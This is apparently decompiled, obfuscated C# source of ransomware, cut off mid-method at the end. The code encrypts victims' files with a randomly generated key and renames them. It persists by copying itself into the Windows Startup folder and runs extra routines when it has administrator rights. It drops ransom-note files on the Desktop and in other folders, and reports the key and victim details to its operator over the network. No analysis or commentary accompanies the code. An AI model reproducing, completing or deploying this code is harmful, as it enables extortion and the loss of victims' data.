								if (!YyTkJTBkSaQ.asKfRIcataD(MRgSqllkMDRCm: (!iRryUAENoXyxNt) ? (CVCyEBDPJVibYms ? YyTkJTBkSaQ.grhgCFxqniVe(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : YyTkJTBkSaQ.grhgCFxqniVe(byte_, Encoding.ASCII.GetBytes(ARnvboqDJfB), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (CVCyEBDPJVibYms ? ivMVFneIiiSs.QBYVYTkGHVQKD(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ivMVFneIiiSs.QBYVYTkGHVQKD(byte_, Encoding.ASCII.GetBytes(ARnvboqDJfB), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), IWBmTKARrJCu: CS_0024_003C_003E8__locals0.BGIywWvGkY, CemBOcHEZGvXd: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.BGIywWvGkY + IUsTjCWCoatx, CS_0024_003C_003E8__locals0.BGIywWvGkY);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!CVCyEBDPJVibYms)
							{
								if (!moeoEUcfSQywx.MtYwfepEBjPifI(CS_0024_003C_003E8__locals0.BGIywWvGkY, PnZVnKFyCNiuKv, ARnvboqDJfB))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.BGIywWvGkY + IUsTjCWCoatx, CS_0024_003C_003E8__locals0.BGIywWvGkY);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!moeoEUcfSQywx.MtYwfepEBjPifI(CS_0024_003C_003E8__locals0.BGIywWvGkY, PnZVnKFyCNiuKv, text, bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.BGIywWvGkY + IUsTjCWCoatx, CS_0024_003C_003E8__locals0.BGIywWvGkY);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (FAXnWIlLgke)
							{
								IUsTjCWCoatx = IHjeiOieyeiso + IUsTjCWCoatx;
							}
							string text2 = auOSwAVUhkz.xXzlwQJswVbf(32);
							string s2 = RWAKpybrscGjni.tVtoOZjiqyF(text2);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (IUsTjCWCoatx != getString_0(107378047))
							{
								if (!DCETDGmAEgibl)
								{
									if (!CVCyEBDPJVibYms)
									{
										qxGcsYEaEgSP(CS_0024_003C_003E8__locals0.BGIywWvGkY, CS_0024_003C_003E8__locals0.BGIywWvGkY + IUsTjCWCoatx, xdThOOfnYmOX);
									}
									else
									{
										qxGcsYEaEgSP(CS_0024_003C_003E8__locals0.BGIywWvGkY, CS_0024_003C_003E8__locals0.BGIywWvGkY + IUsTjCWCoatx, Encoding.ASCII.GetBytes(text2));
									}
								}
								else
								{
									try
									{
										if (!CVCyEBDPJVibYms)
										{
											plvpumDZMr(CS_0024_003C_003E8__locals0.BGIywWvGkY, CS_0024_003C_003E8__locals0.BGIywWvGkY + IUsTjCWCoatx, xdThOOfnYmOX);
										}
										else
										{
											plvpumDZMr(CS_0024_003C_003E8__locals0.BGIywWvGkY, CS_0024_003C_003E8__locals0.BGIywWvGkY + IUsTjCWCoatx, Encoding.ASCII.GetBytes(text2));
										}
									}
									catch (Exception ex9)
									{
										if (JJYUPCZGaGN)
										{
											try
											{
												File.AppendAllText(vzSBJQFXpb, getString_0(107378806) + CS_0024_003C_003E8__locals0.BGIywWvGkY + getString_0(107378001) + ex9.Message + getString_0(107397174));
											}
											catch (Exception)
											{
											}
										}
										AmOSyvkYqZhk++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.BGIywWvGkY + IUsTjCWCoatx, CS_0024_003C_003E8__locals0.BGIywWvGkY);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!DCETDGmAEgibl)
							{
								if (!CVCyEBDPJVibYms)
								{
									qxGcsYEaEgSP(CS_0024_003C_003E8__locals0.BGIywWvGkY, CS_0024_003C_003E8__locals0.BGIywWvGkY + getString_0(107378042), xdThOOfnYmOX);
								}
								else
								{
									qxGcsYEaEgSP(CS_0024_003C_003E8__locals0.BGIywWvGkY, CS_0024_003C_003E8__locals0.BGIywWvGkY + getString_0(107378042), Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!CVCyEBDPJVibYms)
									{
										plvpumDZMr(CS_0024_003C_003E8__locals0.BGIywWvGkY, CS_0024_003C_003E8__locals0.BGIywWvGkY, xdThOOfnYmOX);
									}
									else
									{
										plvpumDZMr(CS_0024_003C_003E8__locals0.BGIywWvGkY, CS_0024_003C_003E8__locals0.BGIywWvGkY, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex12)
								{
									if (JJYUPCZGaGN)
									{
										try
										{
											File.AppendAllText(vzSBJQFXpb, getString_0(107378806) + CS_0024_003C_003E8__locals0.BGIywWvGkY + getString_0(107378001) + ex12.Message + getString_0(107397174));
										}
										catch (Exception)
										{
										}
									}
									AmOSyvkYqZhk++;
									return;
								}
							}
							if (CVCyEBDPJVibYms)
							{
								if (IUsTjCWCoatx != getString_0(107378047))
								{
									emEmxwYCVRMX(CS_0024_003C_003E8__locals0.BGIywWvGkY + IUsTjCWCoatx, bytes2);
								}
								else
								{
									emEmxwYCVRMX(CS_0024_003C_003E8__locals0.BGIywWvGkY, bytes2);
								}
							}
						}
						end_IL_0656_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_0df4;
			IL_0df4:
			dDmITDjvmcD.Remove(CS_0024_003C_003E8__locals0.BGIywWvGkY);
		}

		static QaTaQbhILmx()
		{
			Strings.CreateGetStringDelegate(typeof(QaTaQbhILmx));
		}
	}

	private sealed class OBNDhcKjAFhYUGN
	{
		public string zbgcGgYGLQQxYE;

		public string sdhvywEqGWLI;

		public void _003CEncrypt2_003Eb__44()
		{
			while (true)
			{
				try
				{
					File.Delete(zbgcGgYGLQQxYE);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__45()
		{
			while (true)
			{
				try
				{
					if (File.Exists(sdhvywEqGWLI))
					{
						File.Delete(sdhvywEqGWLI);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string ONQHMlPKrvSNNg;

	public static byte[] xdThOOfnYmOX;

	public static string txqzvgdCEQF;

	public static string HYSHgMyGCmRaP;

	public static List<string> RSEYqZQHxTlgU;

	public static List<string> uNOGqJxLgNfEx;

	public static string mZiPlbMxvKjMRh;

	public static string ARnvboqDJfB;

	public static string RXJEMuLOvPXmM;

	public static string DwcBIhdaeLV;

	public static int KgkvqSJQtZ;

	public static string uvAbidagcyNet;

	public static string WFeWWtxpadDRhJK;

	public static string MgsxbQhNsveGhtg;

	public static string ZVkrmhCmleabiHT;

	public static string CiWdTHwrdzkSneJ;

	public static string xtIYXPvbuIJEP;

	public static string ojKSSztKIGB;

	public static string VoYOPMaGaMnOVDFyi;

	public static List<string> nmdgopXGYgo;

	public static List<string> LvCohppTPrblek;

	public static string LsrmgCBKEL;

	public static string TyifAvgdwt;

	public static string xomQQmIXYWpclvF;

	public static List<string> GfJosmTooKpZJP;

	public static string blZTtpgnxEegy;

	private static string wzfKLpsdfNdrT;

	public static string GUXQCPvWRuYo;

	public static string iNcHwTAiwxSbGa;

	public static List<string> zwooCDGxcVUnvYgCk;

	public static List<string> tYWpKAuFUmGf;

	public static List<string> ifTEDxlMnuTZQ;

	public static List<string> KXhXGePQDEZDL;

	public static string wkEmfSxwmzT;

	public static List<string> uNUvSMAaNbE;

	public static List<string> oKdmKTTglf;

	public static string cjhxiWZpwAn;

	public static string yYAthlfRBbt;

	internal static DateTime StkEbImMCbtrgdu;

	internal static DateTime LoigGdnjgcUKsiZ;

	public static string OKoHtjQYjxHns;

	public static string PnZVnKFyCNiuKv;

	public static string BRicohgBJnxQ;

	public static string wjIBIUazAZFQ;

	public static string qBEQrrMwITse;

	public static string AIuEhRYiNnYdk;

	public static string CuHkRABBXl;

	public static string bdRzRfVgdufg;

	public static List<string> WIlNSOXrZeC;

	public static string PIdfVhNVvVogR;

	public static string zshVWAjTCa;

	public static string VUNAdynhoQ;

	public static string cSURllrGISXxER;

	public static string FPngYwpRsvyPHu;

	public static string MpKuXCANucKv;

	public static string VCfxGRKgrJMnuih;

	public static string kQkJNzvKzzqIQaY;

	public static string KBJvdPMmjzTQDS;

	public static string qwKvoNoQFi;

	public static string ZstNmYcaky;

	public static string ocvMNTGTKYpYXC;

	public static string cwapJyBOOyLzU;

	public static string OBXPdvxMybik;

	public static string JJikdGMjNneam;

	public static string okARNIqGXig;

	public static string pZrmcEPHiixji;

	public static string jlAopDBCdV;

	public static string tqiTaLTjAiFsV;

	public static string ntagmnsgvSkoTT;

	public static string VFNHlTCAhVOW;

	public static string QCbYHFYnKsrGh;

	public static string OGrufRdQgWPqA;

	public static string FtfEHcuGYoigQT;

	public static string MvmlvFwyfsdEjaTm;

	public static string FeVyeNgKIlgRZE;

	public static string TJlCZFndoKUA;

	public static string rdyyZAaJuCfFKzJOPg;

	public static string cJaDcuvoWf;

	public static string[] JuuHnIfwBa;

	public static string cdzmoqFlfITSP;

	public static bool iRryUAENoXyxNt;

	public static string eqYgovaJkUYKPn;

	public static bool CVCyEBDPJVibYms;

	public static bool ZDbHiLoVEkHSf;

	public static bool gynwAGVYLLHMFI;

	public static bool gNedWFYXVKDcDY;

	public static string vzSBJQFXpb;

	public static bool JJYUPCZGaGN;

	public static bool jMQEiNiMqdQad;

	public static bool NOsBuCdCpQJFTN;

	public static bool YgToHXrQdwK;

	public static bool DCETDGmAEgibl;

	public static string kVZoVJTgfl;

	public static bool WmRKwcdDWVtNion;

	public static Stopwatch MpxTVcQhNlzAF;

	public static int AmOSyvkYqZhk;

	public static int ytQePvltMhp;

	public static bool FAXnWIlLgke;

	public static string IHjeiOieyeiso;

	public static string[] wKDLKsoOvhGs;

	public static List<string> qvPWtnGDFercawvHYD;

	public static int ywMnaFcwkyBX;

	public static List<string> ytjIPDBCZRI;

	public static List<string> nEVBfCXOqpRfsLK;

	public static List<string> rxZfFrQVmuwA;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatec;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			aaKsyZRyUQczJ CS_0024_003C_003E8__locals0 = new aaKsyZRyUQczJ();
			CS_0024_003C_003E8__locals0.hOGxQHlNgrJ = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.hOGxQHlNgrJ) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			WWeQGTxUASTWH.ZGuWqxAqMy(wzfKLpsdfNdrT);
		}
		catch (Exception)
		{
		}
		try
		{
			if (FeVyeNgKIlgRZE == getString_0(107396927))
			{
				Thread thread = new Thread(tJMYlVuWGJ.tbTGCppDggkdVF);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (MgsxbQhNsveGhtg == getString_0(107396927))
		{
			Thread.Sleep(int.Parse(ZVkrmhCmleabiHT));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && CuHkRABBXl == getString_0(107396927))
		{
			try
			{
				CRiQbGVehMvbeq(gvCYkntYkqMW(getString_0(107396922)));
			}
			catch
			{
			}
		}
		try
		{
			if (ojKSSztKIGB == getString_0(107396927) && sJWKyMjQFWbP.FYXuyJEQqsGtsF())
			{
				new fsCyfZlwoNr().hXHxHtpQwrDh(bool_0: false);
				sJWKyMjQFWbP.KhwpNTKwqOY();
			}
		}
		catch (Exception)
		{
		}
		if (TyifAvgdwt == getString_0(107396927) && sJWKyMjQFWbP.FYXuyJEQqsGtsF())
		{
			new fsCyfZlwoNr().hXHxHtpQwrDh(bool_0: false);
			new fsCyfZlwoNr().WjboLcIgqQbXx();
		}
		if (WFeWWtxpadDRhJK == getString_0(107396927))
		{
			bQSksvDvRWjEp.IiGHahHcjYnU();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396817);
			string text2 = text + Path.GetFileName(fileName);
			if (DwcBIhdaeLV == getString_0(107396927) && fileName != text2)
			{
				Thread thread2 = new Thread(iixxfqiTrdbTQC);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (mZiPlbMxvKjMRh == getString_0(107396927) && mainModule != null && fileName != text2)
			{
				try
				{
					KgkvqSJQtZ = UGlLISPeWmgRi(0, nmdgopXGYgo.Count);
					File.Copy(fileName, text + nmdgopXGYgo[KgkvqSJQtZ], overwrite: true);
					Process.Start(text + nmdgopXGYgo[KgkvqSJQtZ]);
					qiPuQJEhLmRex();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (cjhxiWZpwAn == getString_0(107396927) && DateTime.Now < StkEbImMCbtrgdu)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (yYAthlfRBbt == getString_0(107396927) && DateTime.Now > LoigGdnjgcUKsiZ)
			{
				qiPuQJEhLmRex();
			}
		}
		catch
		{
		}
		YaLCqtEcgIco();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatec == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatec = delegate
			{
				List<string> source = tYWpKAuFUmGf;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						sroZTJGCRhFP(gvCYkntYkqMW(getString_0(107377960)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				List<string> source2 = ifTEDxlMnuTZQ;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						sroZTJGCRhFP(gvCYkntYkqMW(getString_0(107377915)), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				if (cJaDcuvoWf == getString_0(107396927))
				{
					string[] juuHnIfwBa = JuuHnIfwBa;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							sroZTJGCRhFP(gvCYkntYkqMW(getString_0(107377915)), getString_0(107377922) + string_0 + getString_0(107377881));
						};
					}
					Parallel.ForEach(juuHnIfwBa, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				if (!fzBOSVsSHwJOy().Contains(getString_0(107378620)))
				{
					rrqSgYKwbeTjR(wkEmfSxwmzT);
				}
				else
				{
					List<string> kXhXGePQDEZDL = KXhXGePQDEZDL;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
						{
							sroZTJGCRhFP(gvCYkntYkqMW(jCEtgwbUwXnV(getString_0(107377876))), string_0);
						};
					}
					Parallel.ForEach(kXhXGePQDEZDL, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				}
				List<string> source3 = uNUvSMAaNbE;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						sroZTJGCRhFP(gvCYkntYkqMW(getString_0(107377851)), string_0);
					};
				}
				Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatec);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		if (cwapJyBOOyLzU == getString_0(107396844))
		{
			sGayiJLLhfGgF();
		}
		if (cwapJyBOOyLzU == getString_0(107396927))
		{
			try
			{
				gGiPQhlsaEDD();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && gynwAGVYLLHMFI)
			{
				try
				{
					Thread thread4 = new Thread(pYXILhqtEBaOVEP.eRYbBXdFff);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			sroZTJGCRhFP(getString_0(107396839), gvCYkntYkqMW(getString_0(107396794)));
		}
		if (LsrmgCBKEL == getString_0(107396927) && XtjIIMlJpCnPhAQ() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(TaboJirPIvtr.IetYuyAZDkh);
			thread5.IsBackground = true;
			thread5.Priority = ThreadPriority.Normal;
			thread5.Start();
		}
		_ = iNcHwTAiwxSbGa == getString_0(107396927);
		SecureString secureString = new SecureString();
		if (BRicohgBJnxQ == getString_0(107396844))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			ARnvboqDJfB = getString_0(107396721);
		}
		RXJEMuLOvPXmM = RWAKpybrscGjni.tVtoOZjiqyF(SmmjZvGwyas(secureString));
		if (kQkJNzvKzzqIQaY == getString_0(107396927))
		{
			vKInFAeIsKtc();
		}
		if (NOsBuCdCpQJFTN)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), kVZoVJTgfl)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), kVZoVJTgfl), string.Concat(gvCYkntYkqMW(getString_0(107397220)), new WebClient().DownloadString(gvCYkntYkqMW(getString_0(107397195))), getString_0(107397154), gvCYkntYkqMW(getString_0(107397117)), DateTime.Now, getString_0(107397154), gvCYkntYkqMW(getString_0(107397076)), RXJEMuLOvPXmM));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), kVZoVJTgfl), getString_0(107397019) + RXJEMuLOvPXmM);
				}
			}
			catch (Exception ex7)
			{
				if (JJYUPCZGaGN)
				{
					try
					{
						File.AppendAllText(vzSBJQFXpb, getString_0(107396990) + ex7.Message + getString_0(107397154));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		MwCQJsqlpSb.eSBhuUbZpjFkh(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), ntagmnsgvSkoTT), fhNGEWEqlpc(RXJEMuLOvPXmM), null, null, getString_0(107396461), getString_0(107396412), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			shCNKMfZJMFlBE();
		}
		try
		{
			try
			{
				if (WmRKwcdDWVtNion)
				{
					Console.WriteLine(getString_0(107396427));
				}
			}
			catch
			{
			}
			TpshjRdvQRXF(new string[1] { getString_0(107396346) }, new string[100]
			{
				getString_0(107396337),
				getString_0(107396364),
				getString_0(107396359),
				getString_0(107396318),
				getString_0(107396313),
				getString_0(107396308),
				getString_0(107396335),
				getString_0(107396330),
				getString_0(107396325),
				getString_0(107396288),
				getString_0(107396283),
				getString_0(107396278),
				getString_0(107396301),
				getString_0(107396296),
				getString_0(107396255),
				getString_0(107396250),
				getString_0(107396245),
				getString_0(107396272),
				getString_0(107396267),
				getString_0(107396262),
				getString_0(107396221),
				getString_0(107396216),
				getString_0(107396211),
				getString_0(107396238),
				getString_0(107396233),
				getString_0(107396228),
				getString_0(107396703),
				getString_0(107396698),
				getString_0(107396693),
				getString_0(107396720),
				getString_0(107396715),
				getString_0(107396710),
				getString_0(107396705),
				getString_0(107396668),
				getString_0(107396659),
				getString_0(107396686),
				getString_0(107396681),
				getString_0(107396676),
				getString_0(107396335),
				getString_0(107396639),
				getString_0(107396325),
				getString_0(107396630),
				getString_0(107396625),
				getString_0(107396652),
				getString_0(107396647),
				getString_0(107396642),
				getString_0(107396605),
				getString_0(107396600),
				getString_0(107396595),
				getString_0(107396622),
				getString_0(107396617),
				getString_0(107396612),
				getString_0(107396575),
				getString_0(107396570),
				getString_0(107396565),
				getString_0(107396592),
				getString_0(107396587),
				getString_0(107396582),
				getString_0(107396541),
				getString_0(107396536),
				getString_0(107396559),
				getString_0(107396546),
				getString_0(107396639),
				getString_0(107396501),
				getString_0(107396524),
				getString_0(107396515),
				getString_0(107396474),
				getString_0(107396465),
				getString_0(107396488),
				getString_0(107396483),
				getString_0(107395930),
				getString_0(107395921),
				getString_0(107395944),
				getString_0(107395939),
				getString_0(107395902),
				getString_0(107395897),
				getString_0(107395892),
				getString_0(107395919),
				getString_0(107395914),
				getString_0(107395905),
				getString_0(107395868),
				getString_0(107395863),
				getString_0(107395858),
				getString_0(107395885),
				getString_0(107395880),
				getString_0(107395839),
				getString_0(107395830),
				getString_0(107395825),
				getString_0(107396705),
				getString_0(107395852),
				getString_0(107395847),
				getString_0(107395842),
				getString_0(107395805),
				getString_0(107395800),
				getString_0(107395823),
				getString_0(107395818),
				getString_0(107395813),
				getString_0(107395772),
				getString_0(107395767),
				getString_0(107395762)
			}, new string[0], SmmjZvGwyas(secureString), getString_0(107395789));
		}
		catch (Exception ex9)
		{
			if (JJYUPCZGaGN)
			{
				try
				{
					File.AppendAllText(vzSBJQFXpb, getString_0(107395736) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395711)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395711));
				streamWriter.WriteLine(gvCYkntYkqMW(getString_0(107396190)));
				streamWriter.WriteLine(getString_0(107397154));
				streamWriter.WriteLine(gvCYkntYkqMW(getString_0(107390692)));
				streamWriter.WriteLine(RXJEMuLOvPXmM);
				if (GUXQCPvWRuYo == getString_0(107396844))
				{
					streamWriter.WriteLine(getString_0(107397154));
					streamWriter.WriteLine(gvCYkntYkqMW(getString_0(107390659)) + Convert.ToString(GfJosmTooKpZJP.Count));
				}
				if (FAXnWIlLgke)
				{
					streamWriter.WriteLine(getString_0(107397154));
					streamWriter.WriteLine(gvCYkntYkqMW(getString_0(107391062)));
					streamWriter.WriteLine(UuDMKkzrJStt.GtkPFNFnFTX());
				}
			}
			else
			{
				string text3 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395711));
				if (!text3.Contains(RXJEMuLOvPXmM) && !CVCyEBDPJVibYms)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395711), getString_0(107391029) + RXJEMuLOvPXmM);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in LvCohppTPrblek)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395711)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395711), item + getString_0(107395711), overwrite: true);
				}
				else
				{
					string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395711));
					if (!text4.Contains(RXJEMuLOvPXmM) && !CVCyEBDPJVibYms)
					{
						File.AppendAllText(item + getString_0(107395711), getString_0(107391029) + RXJEMuLOvPXmM);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!gNedWFYXVKDcDY && num > 10)
			{
				break;
			}
		}
		if (OGrufRdQgWPqA == getString_0(107396927))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391000)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391000));
					streamWriter2.WriteLine(gvCYkntYkqMW(getString_0(107390967)));
					streamWriter2.WriteLine(getString_0(107397154));
					streamWriter2.WriteLine(gvCYkntYkqMW(getString_0(107350235)));
					streamWriter2.WriteLine(RXJEMuLOvPXmM + gvCYkntYkqMW(getString_0(107350178)));
					if (GUXQCPvWRuYo == getString_0(107396844))
					{
						streamWriter2.WriteLine(getString_0(107397154));
						streamWriter2.WriteLine(gvCYkntYkqMW(getString_0(107350133)) + gvCYkntYkqMW(getString_0(107390659)) + Convert.ToString(GfJosmTooKpZJP.Count) + gvCYkntYkqMW(getString_0(107350178)));
					}
					if (FAXnWIlLgke)
					{
						streamWriter2.WriteLine(getString_0(107397154));
						streamWriter2.WriteLine(gvCYkntYkqMW(getString_0(107391062)));
						streamWriter2.WriteLine(UuDMKkzrJStt.GtkPFNFnFTX());
					}
				}
				else
				{
					string text5 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395711));
					if (!text5.Contains(RXJEMuLOvPXmM) && !CVCyEBDPJVibYms)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391000), gvCYkntYkqMW(getString_0(107350133)) + getString_0(107391029) + RXJEMuLOvPXmM + gvCYkntYkqMW(getString_0(107350178)));
					}
				}
			}
			catch
			{
			}
		}
		if (blZTtpgnxEegy == getString_0(107396927))
		{
			try
			{
				if (GUXQCPvWRuYo == getString_0(107396844))
				{
					UuDMKkzrJStt.ztOsxsyMoKN(getString_0(107350584), getString_0(107350579), getString_0(107350598), string.Concat(gvCYkntYkqMW(getString_0(107397220)), new WebClient().DownloadString(gvCYkntYkqMW(getString_0(107397195))), getString_0(107350557), gvCYkntYkqMW(getString_0(107397117)), DateTime.Now, getString_0(107397154), gvCYkntYkqMW(getString_0(107350552)), Convert.ToString(GfJosmTooKpZJP.Count), getString_0(107397154), gvCYkntYkqMW(getString_0(107397076)), RXJEMuLOvPXmM));
				}
				else
				{
					UuDMKkzrJStt.ztOsxsyMoKN(getString_0(107350584), getString_0(107350579), getString_0(107350598), string.Concat(gvCYkntYkqMW(getString_0(107397220)), new WebClient().DownloadString(gvCYkntYkqMW(getString_0(107397195))), getString_0(107350557), gvCYkntYkqMW(getString_0(107397117)), DateTime.Now, getString_0(107397154), gvCYkntYkqMW(getString_0(107350552)), Convert.ToString(GfJosmTooKpZJP.Count), getString_0(107397154), gvCYkntYkqMW(getString_0(107397076)), RXJEMuLOvPXmM));
				}
			}
			catch
			{
			}
		}
		if (VoYOPMaGaMnOVDFyi == getString_0(107396927))
		{
			try
			{
				DAzHqkdlDXTrn.yXSNFeGWAnl(new Uri(getString_0(107350535)));
			}
			catch
			{
			}
		}
		if (OGrufRdQgWPqA == getString_0(107396844))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395711)))
				{
					Process.Start(gvCYkntYkqMW(getString_0(107350534)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395711));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391000)))
				{
					Process.Start(gvCYkntYkqMW(getString_0(107350509)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391000));
				}
			}
			catch
			{
			}
		}
		if (kQkJNzvKzzqIQaY == getString_0(107396927))
		{
			if (KBJvdPMmjzTQDS == getString_0(107396927) && !string.IsNullOrEmpty(qwKvoNoQFi) && !string.IsNullOrEmpty(ZstNmYcaky))
			{
				orbStwiBbUb(qwKvoNoQFi, ZstNmYcaky);
			}
			else
			{
				orbStwiBbUb(getString_0(107350460), getString_0(107350431));
			}
		}
		if (pZrmcEPHiixji != getString_0(107349685))
		{
			mgVkCbxDdYLKyGu(pZrmcEPHiixji);
		}
		if (!string.IsNullOrEmpty(MpKuXCANucKv))
		{
			try
			{
				File.Delete(MpKuXCANucKv);
			}
			catch
			{
			}
		}
		if (JJYUPCZGaGN)
		{
			try
			{
				File.AppendAllText(vzSBJQFXpb, getString_0(107349700));
			}
			catch (Exception)
			{
			}
		}
		if (ONQHMlPKrvSNNg == getString_0(107349655))
		{
			qiPuQJEhLmRex();
		}
	}

	public static void iixxfqiTrdbTQC()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(gvCYkntYkqMW(getString_0(107349678)), gvCYkntYkqMW(getString_0(107350460)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int UGlLISPeWmgRi(int int_0, int int_1)
	{
